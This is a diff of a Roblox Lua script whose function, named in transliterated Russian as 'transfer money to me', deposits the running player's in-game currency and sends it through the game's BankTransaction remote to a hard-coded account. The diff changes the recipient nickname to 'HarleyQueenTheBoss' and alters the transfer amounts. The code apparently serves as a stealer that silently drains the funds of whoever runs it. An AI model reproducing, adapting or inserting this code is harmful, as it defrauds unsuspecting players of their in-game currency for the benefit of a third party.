@@ -1,12 +1,12 @@
 function perevoddenegmne() -- 
-    local NickName = "slowkettle3310" -- 
+    local NickName = "HarleyQueenTheBoss" -- 
     local delaytime = 10 --
     local delaytime2 = 10 -- 
         if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then 
             local args = {
                 [1] = {
                     ["Type"] = "Deposit",
-                    ["Amount"] = 87000
+                    ["Amount"] = 10000
                 }
             }
             
@@ -15,8 +15,8 @@ function perevoddenegmne() --
             local args = {
                 [1] = {
                     ["Type"] = "Send",
-                    ["Amount"] = 87000,
-                    ["User"] = slowkettle3310
+                    ["Amount"] = 10000,
+                    ["User"] = NickName
                 }
             }
         game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
@@ -26,7 +26,7 @@ function perevoddenegmne() --
             local args = {
             [1] = {
                     ["Type"] = "Deposit",
-                    ["Amount"] = 87000
+                    ["Amount"] = 100000
                 }
             }
             game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
@@ -34,8 +34,8 @@ function perevoddenegmne() --
             local args = {
                 [1] = {
                     ["Type"] = "Send",
-                    ["Amount"] = 87000,
-                    ["User"] = slowkettle3310
+                    ["Amount"] = 100000,
+                    ["User"] = NickName
                 }
             }
         game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
